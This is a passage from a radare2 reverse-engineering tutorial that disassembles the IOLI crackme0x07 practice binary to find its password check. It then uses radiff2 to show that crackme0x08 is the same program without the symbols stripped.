(the last push before _imp.__libc_start_main_) $ r2 ./crackme0x07 [0x08048400]&gt; aa [0x08048400]&gt; pdf / function: section..text (34) | 0x08048400 section..text: | 0x08048400 31ed xor ebp, ebp ; [13] va=0x08048400 pa=0x00000400 sz=900 vsz=900 rwx=-r-x .text | 0x08048402 5e pop esi | 0x08048403 89e1 mov ecx, esp | 0x08048405 83e4f0 and esp, 0xfffffff0 | 0x08048408 50 push eax | 0x08048409 54 push esp | 0x0804840a 52 push edx | 0x0804840b 6850870408 push dword 0x8048750 | 0x08048410 68e0860408 push dword 0x80486e0 | 0x08048415 51 push ecx | 0x08048416 56 push esi | 0x08048417 687d860408 push dword 0x804867d | 0x0804841c e867ffffff call dword imp.__libc_start_main | ; imp.__libc_start_main() \ 0x08048421 f4 hlt ; ------------ By the way, this is the start function. [0x08048400]&gt; pdf@0x804867d / function: main (99) | 0x0804867d main: | 0x0804867d 55 push ebp | 0x0804867e 89e5 mov ebp, esp | 0x08048680 81ec88000000 sub esp, 0x88 | 0x08048686 83e4f0 and esp, 0xfffffff0 | 0x08048689 b800000000 mov eax, 0x0 | 0x0804868e 83c00f add eax, 0xf | 0x08048691 83c00f add eax, 0xf | 0x08048694 c1e804 shr eax, 0x4 | 0x08048697 c1e004 shl eax, 0x4 | 0x0804869a 29c4 sub esp, eax | 0x0804869c c70424d9870408 mov dword [esp], str.IOLICrackmeLevel0x07 | 0x080486a3 e810fdffff call dword imp.printf | ; imp.printf() | 0x080486a8 c70424f2870408 mov dword [esp], str.Password | 0x080486af e804fdffff call dword imp.printf | ; imp.printf() | 0x080486b4 8d4588 lea eax, [ebp-0x78] | 0x080486b7 89442404 mov [esp+0x4], eax | 0x080486bb c70424fd870408 mov dword [esp], 0x80487fd | 0x080486c2 e8d1fcffff call dword imp.scanf | ; imp.scanf() | 0x080486c7 8b4510 mov eax, [ebp+0x10] | 0x080486ca 89442404 mov [esp+0x4], eax | 0x080486ce 8d4588 lea eax, [ebp-0x78] | 0x080486d1 890424 mov [esp], eax | 0x080486d4 e8e0feffff call dword fcn.080485b9 | ; fcn.080485b9() | 0x080486d9 b800000000 mov eax, 0x0 | 0x080486de c9 leave \ 0x080486df c3 ret ; ------------ Our main(). [0x08048400]&gt; pdf@fcn.080485b9 ; CODE (CALL) XREF 0x080486d4 (main) / function: fcn.080485b9 (196) | 0x080485b9 fcn.080485b9: | 0x080485b9 55 push ebp | 0x080485ba 89e5 mov ebp, esp | 0x080485bc 83ec28 sub esp, 0x28 | 0x080485bf c745f800000000 mov dword [ebp-0x8], 0x0 | 0x080485c6 c745f400000000 mov dword [ebp-0xc], 0x0 | . ; CODE (JMP) XREF 0x08048628 (fcn.080485b9) / loc: loc.080485cd (176) | . 0x080485cd loc.080485cd: | .---&gt; 0x080485cd 8b4508 mov eax, [ebp+0x8] | | 0x080485d0 890424 mov [esp], eax | | 0x080485d3 e8d0fdffff call dword imp.strlen | | ; imp.strlen() | | 0x080485d8 3945f4 cmp [ebp-0xc], eax | | ,=&lt; 0x080485db 734d jae loc.0804862a | | | 0x080485dd 8b45f4 mov eax, [ebp-0xc] | | | 0x080485e0 034508 add eax, [ebp+0x8] | | | 0x080485e3 0fb600 movzx eax, byte [eax] | | | 0x080485e6 8845f3 mov [ebp-0xd], al | | | 0x080485e9 8d45fc lea eax, [ebp-0x4] | | | 0x080485ec 89442408 mov [esp+0x8], eax | | | 0x080485f0 c7442404c2870408 mov dword [esp+0x4], 0x80487c2 | | | 0x080485f8 8d45f3 lea eax, [ebp-0xd] | | | 0x080485fb 890424 mov [esp], eax | | | 0x080485fe e8c5fdffff call dword imp.sscanf | | | ; imp.sscanf() | | | 0x08048603 8b55fc mov edx, [ebp-0x4] | | | 0x08048606 8d45f8 lea eax, [ebp-0x8] | | | 0x08048609 0110 add [eax], edx | | | 0x0804860b 837df810 cmp dword [ebp-0x8], 0x10 | |,==&lt; 0x0804860f 7512 jnz loc.08048623 | ||| 0x08048611 8b450c mov eax, [ebp+0xc] | ||| 0x08048614 89442404 mov [esp+0x4], eax | ||| 0x08048618 8b4508 mov eax, [ebp+0x8] | ||| 0x0804861b 890424 mov [esp], eax | ||| 0x0804861e e81fffffff call dword fcn.08048542 | ||| ; fcn.08048542() | || ; CODE (JMP) XREF 0x0804860f (fcn.080485b9) / loc: loc.08048623 (90) | || 0x08048623 loc.08048623: | |`--&gt; 0x08048623 8d45f4 lea eax, [ebp-0xc] | | | 0x08048626 ff00 inc dword [eax] | `===&lt; 0x08048628 eba3 jmp loc.080485cd | | ; CODE (JMP) XREF 0x080485db (fcn.080485b9) / loc: loc.0804862a (83) | | 0x0804862a loc.0804862a: | `-&gt; 0x0804862a e8f5feffff call dword fcn.08048524 | | ; fcn.08048524() | 0x0804862f 8b450c mov eax, [ebp+0xc] | 0x08048632 89442404 mov [esp+0x4], eax | 0x08048636 8b45fc mov eax, [ebp-0x4] | 0x08048639 890424 mov [esp], eax | 0x0804863c e873feffff call dword fcn.080484b4 | ; fcn.080484b4() | 0x08048641 85c0 test eax, eax | ,====&lt; 0x08048643 7436 jz loc.0804867b | | 0x08048645 c745f400000000 mov dword [ebp-0xc], 0x0 | | ; CODE (JMP) XREF 0x08048679 (fcn.080485b9) / loc: loc.0804864c (49) | | 0x0804864c loc.0804864c: | | 0x0804864c 837df409 cmp dword [ebp-0xc], 0x9 | ,=====&lt; 0x08048650 7f29 jg loc.0804867b | || 0x08048652 8b45fc mov eax, [ebp-0x4] | || 0x08048655 83e001 and eax, 0x1 | || 0x08048658 85c0 test eax, eax | ,======&lt; 0x0804865a 7518 jnz loc.08048674 | ||| 0x0804865c c70424d3870408 mov dword [esp], str.wtf? | ||| 0x08048663 e850fdffff call dword imp.printf | ||| ; imp.printf() | ||| 0x08048668 c7042400000000 mov dword [esp], 0x0 | ||| 0x0804866f e874fdffff call dword imp.exit | ||| ; imp.exit() | | ; CODE (JMP) XREF 0x0804865a (fcn.080485b9) / loc: loc.08048674 (9) | | 0x08048674 loc.08048674: | `------&gt; 0x08048674 8d45f4 lea eax, [ebp-0xc] | || 0x08048677 ff00 inc dword [eax] | || 0x08048679 ebd1 jmp loc.0804864c | || ; CODE (JMP) XREF 0x08048643 (fcn.080485b9) | || ; CODE (JMP) XREF 0x08048650 (fcn.080485b9) / loc: loc.0804867b (2) | || 0x0804867b loc.0804867b: | ``----&gt; 0x0804867b c9 leave \ 0x0804867c c3 ret ; ------------ This part looks like our previously seen sym.check function.But bigger. Don’t be scared.You can recognize the key verification routine of the previous crackme: :::python s = 0 for i in password: s += i if s == 0x10: sym.parell() print &quot;BADBOY&quot; As you may have guessed, parell is 08048542 pdf@08048542 ; CODE (CALL) XREF 0x0804861e (fcn.080485b9) / function: fcn.08048542 (119) | 0x08048542 fcn.08048542: | 0x08048542 55 push ebp | 0x08048543 89e5 mov ebp, esp | 0x08048545 83ec18 sub esp, 0x18 | 0x08048548 8d45fc lea eax, [ebp-0x4] | 0x0804854b 89442408 mov [esp+0x8], eax | 0x0804854f c7442404c2870408 mov dword [esp+0x4], 0x80487c2 | 0x08048557 8b4508 mov eax, [ebp+0x8] | 0x0804855a 890424 mov [esp], eax | 0x0804855d e866feffff call dword imp.sscanf | ; imp.sscanf() | 0x08048562 8b450c mov eax, [ebp+0xc] | 0x08048565 89442404 mov [esp+0x4], eax | 0x08048569 8b45fc mov eax, [ebp-0x4] | 0x0804856c 890424 mov [esp], eax | 0x0804856f e840ffffff call dword fcn.080484b4 | ; fcn.080484b4() | 0x08048574 85c0 test eax, eax | ,=&lt; 0x08048576 743f jz loc.080485b7 | | 0x08048578 c745f800000000 mov dword [ebp-0x8], 0x0 | | ; CODE (JMP) XREF 0x080485b5 (fcn.08048524) / loc: loc.0804857f (58) | | 0x0804857f loc.0804857f: | | 0x0804857f 837df809 cmp dword [ebp-0x8], 0x9 | ,==&lt; 0x08048583 7f32 jg loc.080485b7 ; If greater than 0x9, jumps over GOODBOY | || 0x08048585 8b45fc mov eax, [ebp-0x4] | || 0x08048588 83e001 and eax, 0x1 | || 0x0804858b 85c0 test eax, eax | ,===&lt; 0x0804858d 7521 jnz loc.080485b0 | ||| 0x0804858f 833d2ca0040801 cmp dword [0x804a02c], 0x1 | ,====&lt; 0x08048596 750c jnz loc.080485a4 | |||| 0x08048598 c70424c5870408 mov dword [esp], str.PasswordOK! | |||| 0x0804859f e814feffff call dword imp.printf | |||| ; imp.printf() | | ; CODE (JMP) XREF 0x08048596 (fcn.08048524) / loc: loc.080485a4 (21) | | 0x080485a4 loc.080485a4: | `----&gt; 0x080485a4 c7042400000000 mov dword [esp], 0x0 | ||| 0x080485ab e838feffff call dword imp.exit | ||| ; imp.exit() | | ; CODE (JMP) XREF 0x0804858d (fcn.08048524) / loc: loc.080485b0 (9) | | 0x080485b0 loc.080485b0: | `---&gt; 0x080485b0 8d45f8 lea eax, [ebp-0x8] | || 0x080485b3 ff00 inc dword [eax] | || 0x080485b5 ebc8 jmp loc.0804857f | || ; CODE (JMP) XREF 0x08048576 (fcn.08048524) | || ; CODE (JMP) XREF 0x08048583 (fcn.08048524) / loc: loc.080485b7 (2) | || 0x080485b7 loc.080485b7: | ``-&gt; 0x080485b7 c9 leave \ 0x080485b8 c3 ret ; ------------ Looks roughly like the previous parell function.Did you noticed the cmp 0x9 instruction within a loop ?Which loop ?There are no upward arrows !You should read the code, instead of looking for arrows. What about: 0x080485b5 ebc8 jmp loc.0804857f This is indeed part of a loop.No other input/ouput than the previous one.What must be inferior to 0x9 ?Maybe our password. $ LOLO= ./crackme0x07 IOLI Crackme Level 0x07 Password: 111111118 Password OK! $ LOLO= ./crackme0x07 IOLI Crackme Level 0x07 Password: 1111111117 Password Incorrect! :) crackme0x08Let’s be lazy clever : our binary rouglhy share the same structure.It would be nice if we could diff them, and focus on the differences, instead ofhaving to reverse them from the start, to remember every routine, … You can do that with radare2, using radiff2 (see the manpage). radiff2 -C crackme0x07 crackme0x08 main 0x804867d | MATCH (1.000000) | 0x804867d sym.main fcn.080485b9 0x80485b9 | MATCH (1.000000) | 0x80485b9 sym.check fcn.08048524 0x8048524 | MATCH (1.000000) | 0x8048524 sym.che fcn.080484b4 0x80484b4 | MATCH (1.000000) | 0x80484b4 sym.dummy fcn.08048542 0x8048542 | MATCH (1.000000) | 0x8048542 sym.parell section..text 0x8048400 | MATCH (1.000000) | 0x8048400 section..text sym.__do_global_dtors_aux 0x8048450 | NEW (0.000000) sym.frame_dummy 0x8048480 | NEW (0.000000) fcn.00000000 0x0 | NEW (0.000000) sym.__do_global_ctors_aux 0x8048760 | NEW (0.000000) sym.__libc_csu_fini 0x8048750 | NEW (0.000000) section..fini 0x8048784 | NEW (0.000000) fcn.0804878d 0x804878d | NEW (0.000000) sym.__libc_csu_init 0x80486e0 | NEW (0.000000) sym.__i686.get_pc_thunk.bx 0x8048755 | NEW (0.000000) section..init 0x8048360 | NEW (0.000000) fcn.08048424 0x8048424 | NEW (0.000000) fcn.0804842d 0x804842d | NEW (0.000000) Surprise ! crackme0x08 is the same than crackme0x07.But there are new functions !Indeed, but look where they are located: dtors, ctors, init, fini.crackme0x07 seems to be the stripped version of crackme0x08. crackme0x09The last crackme is left as an exercise to the reader. ConclusionNow go break some crackmes with radare2 !]]></content>
  </entry>
</search>
